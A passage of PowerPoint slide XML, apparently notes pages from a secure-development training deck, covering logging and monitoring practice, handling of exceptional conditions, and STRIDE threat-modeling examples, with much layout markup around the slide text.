          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2EE41B93-41C9-37B4-77F3-08703962450C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>43</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12193549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1A70B-C9E1-B366-0722-07EDFAC0B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9BE95-7B5C-9C03-41D5-54F0C4F02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800C9-EFE2-9EF4-D000-622A9B511DBF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Logs are essential, but must also be properly configured and secured</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Ensure all login, access control, and server-side input validation failures can be logged with sufficient user context to identify suspicious or malicious accounts and held for enough time to allow delayed forensic analysis.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Ensure that every part of your app that contains a security control is logged, whether it succeeds or fails.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Ensure that logs are generated in a format that log management solutions can easily consume.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Ensure log data is encoded correctly to prevent injections or attacks on the logging or monitoring systems.</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BB1DD716-4775-32DF-EDF7-95E5873979EE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>44</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1787242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4AB4-AD34-4B3E-2801-ACAF49745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AFE63-FD4A-72B7-A060-73FAB9D4A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CBA72-B58B-C0E3-DD1A-5D11E2A196BE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>This is a new category for 2025</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Plan for such situations (expect the worst). </a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Include throwing an error (to inform the user in an understandable way), logging of the event, as well as issuing an alert if we feel that is justified.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Have monitoring and/or observability tooling or functionality that watches for repeated errors or patterns that indicate an on-going attack, that could issue a response, defense, or blocking of some kind</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D00614A7-D066-A1A1-6299-0D313CBD7DC0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>45</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="21697356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534EA-6C58-43F4-A359-2CB12FF6D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B3CD4-9707-07C4-F316-F38E3B481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EA7E9-D669-0B8C-1738-1F47E5FF01F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1F57B995-7A03-517B-7F6D-A44DF8E9A96A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>47</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36637878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3CA5-88E9-FF63-1CBF-579A6F531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3C546-B930-DB61-9470-633A1C655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E0BDA-6350-61E1-6CE3-E24BADF8CEA0}"/>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6290697-3D92-0DEF-F639-9010C5F01CDD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>48</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16763384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0A1A-AB13-9F88-8611-F9F2B55AA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1B5B3-E90E-5664-88CF-7941375BF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A5C98-603A-759F-AD19-0F77B0A947F1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>You’d respond with badge verification, tamper-evident seals, signed scan logs, redacted labels, rate limits/queueing, and access-controlled cages. STRIDE in software maps the same way.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F783ADB2-702C-CBD3-66E7-0C47167893A0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>49</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1649896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50668-3C46-B0EA-F22A-646BBBB1F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FC77E-65AA-8236-C5C5-72F680C73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5690A-EFFD-806F-9661-7F210CC3389A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>More examples:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>S - Missing </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>mTLS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t> between services; any pod can call “trusted” internal APIs.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>T - Unsigned webhooks let attacker forge “payment received”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>R - Admins make changes via shared accounts</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>I - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Verbose error messages leak stack traces, secrets</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>D - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TinyTLS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t> handshakes exhaust CPU</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>E - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>overly broad IAM/ACLs enable role escalation; insecure deserialization → RCE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0D0D0D"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>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6CE9FE91-630F-304E-5780-787BD98BC2B4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>50</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1683265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B0AB4-2DD4-849A-D3EB-88791BCA8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8AE5C-2395-6F40-9961-767DF6B46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5C007-D957-0FCA-4DFB-85B4BCF89738}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Enumerate ALL your assets. If you miss one, it could </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>becomoe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>uprotected</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> entry point</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BE156AE5-A82E-723C-03AD-B7FCA113089E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>51</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3619829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ABE4-5906-3B0C-0246-B5A1E7850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E998C-8B0F-AAD0-B084-95E4C24FD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B90F7-4DDD-5471-2824-CAC98E278233}"/>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77FEBE71-D7F1-ECEF-499E-F2D852BEE31E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>52</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="40427684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C4BA2-75E9-3C8C-E734-8FB93F6FC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9CAD5-A78E-FD7C-9575-9986BB807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FF0B2-1D15-8256-FB68-7A4928654D24}"/>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0D95A466-6862-DBD2-FECA-60A179FECB79}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>53</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25526102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5DCC5-C706-9CC3-0D46-1EC3609A6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B2687-68B0-A28A-2A7E-64024317B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D5D57A-C87F-5B81-FED4-0292D4E635A2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Capture </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>threat statements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t> in one sentence each</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AFCD340B-6618-04B7-E256-AD7832574754}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>54</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2190155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24E4-D804-1C4B-1410-95563BC13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5F00A-2063-8D87-203E-37814F013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25B32-12FA-B711-EF02-C2E6E4CEAC03}"/>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BEDCC79D-B453-0187-A7B8-2B1947BE98A1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>55</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2599411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08F5B-CA32-98AD-4919-CC448D955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3D78E-6A12-EDB2-3DDB-4E62F5968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34E0C-C602-01BD-9FB2-3BCCC6B2ABC2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Capture </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>threat statements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t> in one sentence each</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E9187C3E-C6F0-E2BE-F56C-4A02E8D2B013}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>56</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18713480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4C21C-26B8-9B1A-980E-AF65A57C9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5F9CF-8C8E-A963-BA8D-37F0AAFD8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E08BA-A637-6671-CD7A-55E4E3D3A2B7}"/>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8F0197F5-CA62-24F8-DC1C-CBBC2F6D5173}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>57</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
